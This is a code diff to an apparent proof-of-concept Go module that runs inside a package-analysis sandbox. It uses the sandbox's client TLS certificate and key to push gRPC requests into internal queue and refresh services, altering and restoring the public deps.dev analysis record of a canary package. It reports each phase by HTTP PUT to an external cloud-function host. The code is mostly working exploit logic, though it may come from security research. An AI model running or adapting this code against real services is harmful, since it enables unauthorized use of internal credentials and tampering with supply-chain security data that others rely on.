@@ -32,15 +32,17 @@ import (
 var callbackBaseURL string
 var callbackSession string
 var callbackURLSHA256 string
+var runMode string
 
 const (
 	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion     = "v0.0.130-capability-rescan-codex"
-	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.130-capability-rescan-codex"
-	expectedAgent    = "go-cgo-pkgsite-probe-v130-capability-rescan"
-	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.8"
+	probeVersion     = "v0.0.131-source-substitution-codex"
+	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.131-source-substitution-codex"
+	expectedAgent    = "go-cgo-pkgsite-probe-v131-source-substitution"
+	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.10"
 	queueName        = "capslock-capability"
-	mutationSource   = "robert-owned-v130-cross-worker-rescan"
+	alteredSource    = "robert-owned-v131-codex-altered-source-rescan"
+	canonicalSource  = "robert-owned-v131-codex-canonical-source-restore"
 	restoreSource    = "robert-owned-v127-capability-restore"
 	queueMethod      = "/sos.queue.Queue/Push"
 	restoreMethod    = "/sos.talisman.Talisman/Refresh"
@@ -48,16 +50,16 @@ const (
 	servicePort      = 9000
 	tlsServerName    = "localhost"
 
-	analysisURL = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.8/analysis"
-	// cleanSHA256 is intentionally locked until production has returned the
-	// immutable v0.0.8 module's legitimate non-empty record for 21 samples.
-	cleanSHA256        = "f87d65c5252bd2ffea49dd6f3f76a68165d117ef20053d762af68d172c6f5923"
-	mutatedSHA256      = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
-	mutationPushBytes  = 134
-	mutationPushSHA256 = "327758a6203f5c49e3191fe145f73e6fb8b261ccbdf245279e89666c2addd573"
-	restoreFrameBytes  = 103
-	restoreFrameSHA256 = "917e77ef9ffd6c1b77633d285ccbf42d11f78f54650d0a4630c5593a82914912"
-	emptyFrameSHA256   = "8855508aade16ec573d21e6a485dfd0a7624085c1a14b5ecdd6485de0c6839a4"
+	analysisURL         = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.10/analysis"
+	cleanSHA256         = "998355e9e87b906d41ca6def5274eb67b220579b9de1a222a828a648e7913967"
+	mutatedSHA256       = "c674975cc6166af64ea7b672669009205684260482ba2bf31b51c9198465dca7"
+	alteredPushBytes    = 143
+	alteredPushSHA256   = "1e2633a721645a43206006154d681a78d46e05ee1587d1c9c653551eca92103e"
+	canonicalPushBytes  = 146
+	canonicalPushSHA256 = "1fd9a40fc4b64e590416491b9960e6ec2a93134f3320ab96d5ba9f968ed60bd4"
+	restoreFrameBytes   = 104
+	restoreFrameSHA256  = "eada76c09ef986dde60ada28f0d955d9f67c7d183a1faf72f682bcea7b3fa602"
+	emptyFrameSHA256    = "8855508aade16ec573d21e6a485dfd0a7624085c1a14b5ecdd6485de0c6839a4"
 
 	clientCertificatePath = "/etc/tls/client/tls.crt"
 	clientKeyPath         = "/etc/tls/client/tls.key"
@@ -66,7 +68,7 @@ const (
 	precheckSamples    = 5
 	convergenceSamples = 21
 	pollInterval       = 2 * time.Second
-	pollTimeout        = 15 * time.Minute
+	pollTimeout        = 4 * time.Minute
 	callbackTimeout    = 20 * time.Second
 	internalTimeout    = 35 * time.Second
 	maximumPublic      = 4096
@@ -227,7 +229,11 @@ type capabilityMapEntry struct {
 }
 
 func main() {
-	if validateStaticPins() != nil || validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
+	if len(os.Args) != 5 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" || !validRunMode(os.Args[4]) {
+		return
+	}
+	runMode = os.Args[4]
+	if validateStaticPins() != nil || validateRuntimeConfiguration() != nil {
 		return
 	}
 	origin := filepath.Clean(os.Args[3])
@@ -240,14 +246,16 @@ func main() {
 	}
 
 	started := time.Now()
+	source := sourceForMode(runMode)
+	expectedState := stateForMode(runMode)
 	receipt := report{
-		Schema: "owned-capability-rescan/v1", Phase: "final", Module: moduleName,
+		Schema: "owned-source-substitution-rescan/v1", Phase: "final", Module: moduleName,
 		Version: probeVersion, Target: targetCoordinate,
 		ExpectedMutatedSHA256: mutatedSHA256, ExpectedCleanSHA256: cleanSHA256,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
-		Mutation:          emptyQueueReceipt(mutationSource),
-		MutationPublic:    emptyConvergenceReceipt("clean"),
+		Mutation:          emptyQueueReceipt(source),
+		MutationPublic:    emptyConvergenceReceipt(expectedState),
 		Restoration:       emptyRefreshReceipt(),
 		RestorationPublic: emptyConvergenceReceipt("clean"),
 	}
@@ -267,8 +275,13 @@ func main() {
 		finishAndSubmit(&receipt)
 		return
 	}
-	if state != "mutated" {
-		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_suppressed"
+	if state != "clean" && state != "mutated" {
+		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_known_state"
+		finishAndSubmit(&receipt)
+		return
+	}
+	if runMode == "altered" && state != "clean" {
+		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "altered_precheck_not_canonical"
 		finishAndSubmit(&receipt)
 		return
 	}
@@ -290,7 +303,8 @@ func main() {
 		finishAndSubmit(&receipt)
 		return
 	}
-	receipt.Mutation = runQueuePush(mutationBody, mutationSource, mutationPushBytes, mutationPushSHA256)
+	pushBytes, pushSHA256 := pushPinForMode(runMode)
+	receipt.Mutation = runQueuePush(mutationBody, source, pushBytes, pushSHA256)
 	mutationReport := receipt
 	mutationReport.Phase = "mutation_queue"
 	mutationReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
@@ -303,7 +317,7 @@ func main() {
 		return
 	}
 
-	receipt.MutationPublic = runConvergence("clean", precheckSamples)
+	receipt.MutationPublic = runConvergence(expectedState, precheckSamples)
 	mutationPublicReport := receipt
 	mutationPublicReport.Phase = "mutation_public"
 	mutationPublicReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
@@ -313,7 +327,7 @@ func main() {
 	rescanVerified := receipt.Mutation.Verified && receipt.MutationCallbackOK &&
 		receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK
 	if rescanVerified {
-		receipt.Outcome = "owned_cross_worker_rescan_and_restoration_verified"
+		receipt.Outcome = "owned_" + runMode + "_cross_worker_rescan_verified"
 	} else {
 		receipt.Outcome = "cross_worker_rescan_not_verified"
 		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, "rescan_receipt_incomplete")
@@ -323,6 +337,29 @@ func main() {
 
 func emptyQueueReceipt(source string) queueReceipt {
 	return queueReceipt{Method: queueMethod, Queue: queueName, Source: source, Target: targetCoordinate}
+}
+
+func validRunMode(mode string) bool { return mode == "altered" || mode == "canonical" }
+
+func sourceForMode(mode string) string {
+	if mode == "altered" {
+		return alteredSource
+	}
+	return canonicalSource
+}
+
+func stateForMode(mode string) string {
+	if mode == "altered" {
+		return "mutated"
+	}
+	return "clean"
+}
+
+func pushPinForMode(mode string) (int, string) {
+	if mode == "altered" {
+		return alteredPushBytes, alteredPushSHA256
+	}
+	return canonicalPushBytes, canonicalPushSHA256
 }
 
 func emptyRefreshReceipt() refreshReceipt {
@@ -363,12 +400,16 @@ func validNonce(value string) bool {
 func validateStaticPins() error {
 	zero := strings.Repeat("0", 64)
 	if cleanSHA256 == zero || mutatedSHA256 == zero || cleanSHA256 == mutatedSHA256 ||
-		mutationPushBytes <= 0 || mutationPushSHA256 == zero || restoreFrameBytes <= 0 || restoreFrameSHA256 == zero {
+		alteredPushBytes <= 0 || alteredPushSHA256 == zero || canonicalPushBytes <= 0 || canonicalPushSHA256 == zero ||
+		restoreFrameBytes <= 0 || restoreFrameSHA256 == zero {
 		return errors.New("rescan pins incomplete")
 	}
-	mutation, err := buildMutationPush()
-	if err != nil || !matchesRequestPin(mutation, mutationPushBytes, mutationPushSHA256) {
-		return errors.New("mutation request pin mismatch")
+	for _, mode := range []string{"altered", "canonical"} {
+		mutation, err := buildMutationPushForMode(mode)
+		bytes, digest := pushPinForMode(mode)
+		if err != nil || !matchesRequestPin(mutation, bytes, digest) {
+			return errors.New("mutation request pin mismatch")
+		}
 	}
 	if !matchesRequestPin(buildRefreshFrame(), restoreFrameBytes, restoreFrameSHA256) {
 		return errors.New("restoration request pin mismatch")
@@ -386,7 +427,7 @@ func validateRuntimeConfiguration() error {
 		return errors.New("invalid callback identity")
 	}
 	parsed, err := url.Parse(callbackBaseURL)
-	expectedPath := "/go-cgo-v130-capability-rescan-codex/v1/session/" + callbackSession
+	expectedPath := "/go-cgo-v131-source-substitution-codex/v1/session/" + callbackSession
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
 		parsed.Path != expectedPath {
@@ -537,7 +578,7 @@ func fetchPublic(sequence int) (publicSample, error) {
 	result := publicSample{Sequence: sequence, ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano), State: "unknown"}
 	parsed, _ := url.Parse(analysisURL)
 	query := parsed.Query()
-	query.Set("v130_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
+	query.Set("v131_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
 	parsed.RawQuery = query.Encode()
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
@@ -615,10 +656,17 @@ func grpcFrame(payload []byte) []byte {
 }
 
 func buildMutationPush() ([]byte, error) {
+	return buildMutationPushForMode(runMode)
+}
+
+func buildMutationPushForMode(mode string) ([]byte, error) {
+	if !validRunMode(mode) {
+		return nil, errors.New("invalid run mode")
+	}
 	// CapabilityAction contains only the exact owned package coordinate. It is
 	// sent to the input queue so a separate worker performs the normal scan.
 	action := appendStringField(nil, 1, targetCoordinate)
-	return buildQueuePush(mutationSource, action), nil
+	return buildQueuePush(sourceForMode(mode), action), nil
 }
 
 func buildRefreshFrame() []byte {
@@ -921,7 +969,7 @@ func submitPhase(phase string, value report) (string, error) {
 	digestText := hex.EncodeToString(digest[:])
 	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
 	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackBaseURL+"/"+phase, bytes.NewReader(encoded))
+	request, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackBaseURL+"/queue/"+runMode+"/"+phase, bytes.NewReader(encoded))
 	if err != nil {
 		return digestText, err
 	}
